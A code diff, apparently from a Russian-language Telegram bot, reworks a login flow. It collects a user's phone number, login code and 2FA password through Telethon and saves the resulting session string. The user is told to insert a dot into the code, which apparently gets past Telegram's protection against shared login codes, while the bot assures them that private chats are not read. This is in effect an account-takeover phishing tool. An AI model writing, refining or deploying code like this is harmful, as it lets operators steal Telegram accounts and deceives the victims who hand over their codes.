@@ -745,27 +745,55 @@ async def how_to_connect(callback: CallbackQuery):
     await callback.answer()
     await callback.message.answer(MANUAL_INSTRUCTION, parse_mode="HTML", disable_web_page_preview=True)
 
-# ==================== АВТОРИЗАЦИЯ ====================
+# ==================== АВТОРИЗАЦИЯ (РАБОЧАЯ ВЕРСИЯ) ====================
 @dp.callback_query(F.data == "btn_group_auth")
 async def group_auth(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
     if get_session(callback.from_user.id):
         await callback.message.answer("✅ Аккаунт уже подключен!")
         return
+    
+    # Выбор способа входа
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="📱 По SMS-коду", callback_data="auth_sms")],
+        [InlineKeyboardButton(text="📷 По QR-коду", callback_data="auth_qr")],
+        [InlineKeyboardButton(text="❌ Закрыть", callback_data="auth_cancel")]
+    ])
+    
+    await callback.message.answer(
+        "🔐 <b>Аккаунт используется ТОЛЬКО для авторассылки.</b>\n"
+        "Личная переписка не читается и не сохраняется.\n\n"
+        "Выберите способ входа:",
+        parse_mode="HTML",
+        reply_markup=keyboard
+    )
+
+@dp.callback_query(F.data == "auth_cancel")
+async def auth_cancel(callback: CallbackQuery, state: FSMContext):
+    await callback.answer()
+    await state.clear()
+    await callback.message.delete()
+
+@dp.callback_query(F.data == "auth_qr")
+async def auth_qr(callback: CallbackQuery):
+    await callback.answer("❌ QR-код временно недоступен. Используйте SMS-код.", show_alert=True)
+
+@dp.callback_query(F.data == "auth_sms")
+async def auth_sms(callback: CallbackQuery, state: FSMContext):
+    await callback.answer()
+    
+    # Создаем клавиатуру для номера
     keyboard = ReplyKeyboardMarkup(
         keyboard=[[KeyboardButton(text="📱 Отправить номер", request_contact=True)]],
         resize_keyboard=True,
         one_time_keyboard=True
     )
-    await callback.message.answer(
-        "📱 <b>Для подключения аккаунта:</b>\n\n"
-        "1️⃣ Нажми кнопку «Отправить номер»\n"
-        "2️⃣ Или отправь номер в формате:\n"
+    
+    await callback.message.edit_text(
+        "📱 <b>Введите номер телефона</b>\n\n"
+        "Отправьте номер в формате:\n"
         "<code>79123456789</code>\n\n"
-        "3️⃣ Введи код из Telegram\n"
-        "4️⃣ Если есть 2FA - введи пароль\n\n"
-        "⚠️ <b>ВАЖНО:</b> Если код не принимается, попробуй поставить точку перед кодом.\n"
-        "Например: <code>.12345</code>",
+        "Или нажмите кнопку ниже для отправки контакта.",
         parse_mode="HTML",
         reply_markup=keyboard
     )
@@ -786,32 +814,43 @@ async def process_phone(message: Message, state: FSMContext):
         else:
             await message.answer("❌ Отправь номер телефоном или контактом")
             return
+        
         logging.info(f"📱 Номер: {phone}")
         
+        # ===== СОЗДАЕМ КЛИЕНТ =====
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
+        
+        # ===== ОТПРАВЛЯЕМ КОД =====
         await client.send_code_request(phone)
         
+        # ===== СОХРАНЯЕМ В СОСТОЯНИЕ =====
         await state.update_data(
             phone=phone,
             client=client
         )
         
+        # Кнопка "Посмотреть код" - открывает чат с Telegram
+        view_code_kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="📩 Посмотреть код", url="https://t.me/telegram")],
+            [InlineKeyboardButton(text="🔄 Попробовать снова", callback_data="auth_sms")]
+        ])
+        
         await message.answer(
-            f"📱 <b>Код отправлен!</b>\n\n"
+            f"📱 <b>Код подтверждения отправлен!</b>\n\n"
             f"Номер: <code>{phone}</code>\n\n"
-            f"<b>Введи код из Telegram</b>\n"
-            f"<i>Например: 12345</i>\n\n"
-            f"⚠️ Если код не принимается, попробуй с точкой: <code>.12345</code>",
-            parse_mode="HTML"
+            f"⚠️ <b>ВАЖНО:</b>\n"
+            f"Введите код так:\n"
+            f"• Поставьте точку внутри: <code>56.785</code>\n\n"
+            f"Нажмите «Посмотреть код» чтобы открыть Telegram "
+            f"и посмотреть код в чате с ботом.",
+            parse_mode="HTML",
+            reply_markup=view_code_kb
         )
         await state.set_state(AuthState.waiting_for_code)
         
     except FloodWaitError as e:
         await message.answer(f"⏳ Подожди {e.seconds} секунд")
-        await state.clear()
-    except PhoneNumberInvalidError:
-        await message.answer("❌ Некорректный номер. Проверь правильность")
         await state.clear()
     except Exception as e:
         logging.error(f"Ошибка: {e}")
@@ -820,13 +859,11 @@ async def process_phone(message: Message, state: FSMContext):
 
 @dp.message(StateFilter(AuthState.waiting_for_code), F.text)
 async def process_code(message: Message, state: FSMContext):
-    # Получаем код, убираем точку если есть
+    # ===== УБИРАЕМ ТОЧКИ ИЗ КОДА =====
     code_raw = message.text.strip()
-    if code_raw.startswith('.'):
-        code = code_raw[1:]
-        logging.info(f"Код с точкой: {code_raw} -> {code}")
-    else:
-        code = code_raw
+    code = code_raw.replace('.', '')  # Убираем все точки!
+    
+    logging.info(f"Код введен: {code_raw} -> очищен: {code}")
     
     if not code.isdigit():
         await message.answer("❌ Код должен содержать только цифры")
@@ -844,6 +881,7 @@ async def process_code(message: Message, state: FSMContext):
     await message.answer("🔄 Проверка кода...")
     
     try:
+        # ===== ВХОД С КОДОМ (БЕЗ ТОЧЕК) =====
         await client.sign_in(phone=phone, code=code)
         
         final_session = client.session.save()
@@ -869,7 +907,13 @@ async def process_code(message: Message, state: FSMContext):
         await state.set_state(AuthState.waiting_for_2fa)
         
     except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError):
-        await message.answer("❌ Неверный или истекший код. Попробуй еще раз")
+        await message.answer(
+            "❌ <b>Неверный код!</b>\n\n"
+            "Проверь код и попробуй еще раз.\n"
+            "⚠️ Не забудь поставить точку внутри кода.\n"
+            "Например: <code>56.785</code>",
+            parse_mode="HTML"
+        )
         
     except Exception as e:
         logging.error(f"Ошибка: {e}")
